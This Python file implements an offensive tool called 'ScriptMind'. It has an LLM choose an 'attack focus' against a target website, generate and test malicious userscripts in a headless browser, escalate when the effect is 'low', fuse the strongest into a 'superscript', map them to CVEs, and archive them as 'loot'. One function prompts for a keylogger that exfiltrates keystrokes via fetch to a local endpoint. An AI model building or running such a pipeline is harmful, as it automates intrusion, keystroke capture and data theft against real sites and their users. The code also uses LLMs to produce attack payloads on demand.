import os
import sys
import time
import json
import re
import zipfile
from datetime import datetime
from urllib.parse import quote
from threading import Thread
from pathlib import Path
from playwright.sync_api import sync_playwright

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_logger import PromptLogger
from llm_wrapper import use_llm
from superscript_cve_infer import run as infer_cves_from_class

COUNT = int(os.getenv("RECON_SM_COUNT", "5"))
ITER = int(os.getenv("RECON_SM_ITER", "2"))

def start_superscript_server(run_path):
    os.chdir(run_path)
    Thread(target=lambda: os.system("python3 -m http.server 8080"), daemon=True).start()

def select_focus_mode(target, run_path):
    prompt = f"""Choose an attack focus for https://{target}.
Return JSON: {{ "focus_mode": "...", "reason": "..." }}"""
    class_path = os.path.join(run_path, "superscript_class.json")
    if os.path.exists(class_path):
        try:
            effect = json.load(open(class_path)).get("effect", "")
            if effect in ["low", "neutral", "unknown"]:
                prompt += "\nPrevious impact was low. Choose something stronger."
        except:
            pass
    result = use_llm("focus_selection", prompt)
    try:
        return json.loads(result.split("\n")[-1])
    except:
        return {"focus_mode": "full", "reason": "fallback"}

def generate_script_batch(target, focus_mode, run_path, count):
    scripts = []
    for i in range(count):
        prompt = f"Create a Violentmonkey userscript for https://{target} (focus: {focus_mode}). No jQuery."
        content = use_llm("script_generation", prompt)
        name = f"gen_{i+1}_{datetime.now().strftime('%H%M%S')}.user.js"
        full_path = os.path.join(run_path, name)
        with open(full_path, "w") as f:
            f.write(content)
        scripts.append({"name": name, "path": full_path, "content": content})
    return scripts

def test_script_once(script_content, target, run_path=None, index=None):
    screenshot_path = os.path.join(run_path, f"shot_{index}.png") if run_path and index else None
    html, console = "", ""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            page.add_init_script(script_content)
            page.goto(f"https://{target}", timeout=20000)
            page.wait_for_timeout(5000)
            if screenshot_path:
                page.screenshot(path=screenshot_path, full_page=True)
            html = page.content()
            console = page.evaluate("() => console.log?.toString?.() || 'no log'")
            page.close()
            browser.close()
    except Exception as e:
        console = str(e)
    if run_path and index:
        with open(os.path.join(run_path, f"output_{index}.html"), "w") as f:
            f.write(html)
        with open(os.path.join(run_path, f"console_{index}.log"), "w") as f:
            f.write(console)
    return html, console

def replay_superscript(script_content, target, run_path):
    return [test_script_once(script_content, target, run_path, i) for i in range(1, 4)]

def evaluate_superscript(script_path, target, run_path):
    script_content = Path(script_path).read_text()
    output = replay_superscript(script_content, target, run_path)
    html = "\n\n".join([o[0][:300] for o in output])
    console = "\n\n".join([o[1][:300] for o in output])
    prompt = f"""Evaluate this userscript executed against https://{target}:

HTML:
{html}

Console:
{console}

Return JSON:
{{ "effect": "...", "class": "...", "module": [...], "note": "..." }}"""
    result = use_llm("script_evaluation", prompt)
    try:
        parsed = json.loads(re.search(r"\{.*\}", result, re.DOTALL).group())
    except:
        parsed = {"effect": "neutral", "class": "none", "module": [], "note": "parse error"}
    with open(os.path.join(run_path, "superscript_class.json"), "w") as f:
        json.dump(parsed, f, indent=2)
    with open(os.path.join(run_path, "superscript_impact.txt"), "w") as f:
        f.write(f"{parsed['effect']}\n{parsed['class']}\n{parsed['note']}")

    # 🧠 CVE-Infer nur bei hoher Wirkung
    if parsed['effect'] in ["high", "medium"]:
        infer_cves_from_class(target, run_path)

def extract_cves_from_superscript(run_path, target):
    file = next((f for f in os.listdir(run_path) if f.startswith("superscript_") and f.endswith(".user.js")), None)
    if not file:
        return
    path = os.path.join(run_path, file)
    content = Path(path).read_text()

    regex_hits = list(set(re.findall(r"(CVE-\d{4}-\d{4,7})", content)))

    prompt = f"""Analyze this userscript against https://{target}.
Which known CVEs might relate to this behavior?
Return a JSON list of CVE IDs.

Code:
{content[:3000]}
"""
    result = use_llm("script_cve_match", prompt)
    try:
        llm_hits = json.loads(result.split("\n")[-1])
    except:
        llm_hits = []

    cves = sorted(set(regex_hits + llm_hits))
    with open(os.path.join(run_path, "superscript_cve_matches.json"), "w") as f:
        json.dump(cves, f, indent=2)
    print(f"[✓] CVEs mapped from Superscript: {cves}")

def build_superscript(scripts, run_path, target):
    prompt = "Combine these Superscripts:\n\n" + "\n\n".join(s["content"][:600] for s in scripts)
    response = use_llm("script_fusion", prompt)
    name = f"superscript_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.user.js"
    path = os.path.join(run_path, name)
    with open(path, "w") as f:
        f.write(response)
    return path

def run_scriptmind_loop(target, run_path):
    print(f"[→] ScriptMind running on {target}")
    focus_data = select_focus_mode(target, run_path)
    focus = focus_data.get("focus_mode", "full")
    all_scripts = []
    for i in range(ITER):
        batch = generate_script_batch(target, focus, run_path, COUNT)
        for script in batch:
            html, log = test_script_once(script["content"], target)
            score = {"wirkung": "low", "bemerkung": "n/a"}
            try:
                score = json.loads(re.search(r"\{.*\}", log, re.DOTALL).group())
            except:
                pass
            all_scripts.append({"script": script, "score": score})
    top = [r["script"] for r in all_scripts if r["score"]["wirkung"] in ["high", "medium"]]
    if top:
        path = build_superscript(top, run_path, target)
        evaluate_superscript(path, target, run_path)
        extract_cves_from_superscript(run_path, target)
        start_superscript_server(run_path)
    else:
        print("[!] No valid Superscript built.")
    try:
        effect = json.load(open(os.path.join(run_path, "superscript_class.json"))).get("effect", "")
        if effect in ["low", "neutral"]:
            print("[↻] Retrying with new focus...")
            run_scriptmind_loop(target, run_path)
    except:
        pass

if __name__ == "__main__":
    target = os.getenv("RECON_KI_TARGET")
    run_path = os.getenv("RECON_KI_RUN_PATH")
    if not target or not run_path:
        exit(1)
    run_scriptmind_loop(target, run_path)

def zip_all_superscripts():
    name = f"superscripts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    out = os.path.join("loot", name)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk("loot"):
            for file in files:
                if file.startswith("superscript_") and file.endswith(".user.js"):
                    full = os.path.join(root, file)
                    z.write(full, arcname=os.path.relpath(full, "loot"))
    print(f"[✓] Superscripts archived: {out}")

def rate_generated_scripts(run_path):
    rows = []
    for f in os.listdir(run_path):
        if f.startswith("gen_") and f.endswith(".impact.txt"):
            try:
                with open(os.path.join(run_path, f)) as fx:
                    lines = fx.readlines()
                    rows.append((f.replace(".impact.txt", ""), lines[0].strip(), lines[1].strip(), lines[2].strip()))
            except:
                pass
    html = ["""<html><head><meta charset='utf-8'><title>Ranking</title>
    <link href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css' rel='stylesheet'></head>
    <body><div class='container'><h2>ScriptMind Ranking</h2><table class='table'><thead><tr><th>Name</th><th>Effect</th><th>Class</th><th>Note</th></tr></thead><tbody>"""]
    for name, effect, cls, note in sorted(rows, key=lambda x: x[1], reverse=True):
        html.append(f"<tr><td>{name}</td><td>{effect}</td><td>{cls}</td><td>{note}</td></tr>")
    html.append("</tbody></table></div></body></html>")
    with open(os.path.join(run_path, "scriptmind_ranking.html"), "w") as f:
        f.write("".join(html))

def combine_superscripts():
    paths = []
    for js in Path("loot").glob("**/superscript_*.user.js"):
        class_file = js.parent / "superscript_class.json"
        if not class_file.exists():
            continue
        try:
            data = json.load(open(class_file))
            if data.get("effect") in ["high", "medium"]:
                paths.append(js)
        except:
            pass
    if not paths:
        return
    snippets = [Path(p).read_text()[:600] for p in paths[:5]]
    prompt = "Combine the following Superscripts into one robust version:\n\n" + "\n\n".join(snippets)
    response = use_llm("superscript_fusion", prompt)
    name = f"superscript_combo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.user.js"
    with open(os.path.join("loot", name), "w") as f:
        f.write(response)

def webexfil_trigger(run_path, target):
    file = os.path.join(run_path, "superscript_class.json")
    if not os.path.exists(file):
        return
    try:
        data = json.load(open(file))
        if data.get("class") != "tracking":
            return
    except:
        return
    prompt = "Generate a userscript that logs keystrokes and exfiltrates via fetch to http://localhost:8080/log.php"
    code = use_llm("webexfil_script", prompt)
    name = f"webexfil_{datetime.now().strftime('%H%M%S')}.user.js"
    with open(os.path.join(run_path, name), "w") as f:
        f.write(code)
    print(f"[+] WebExfil script saved: {name}")
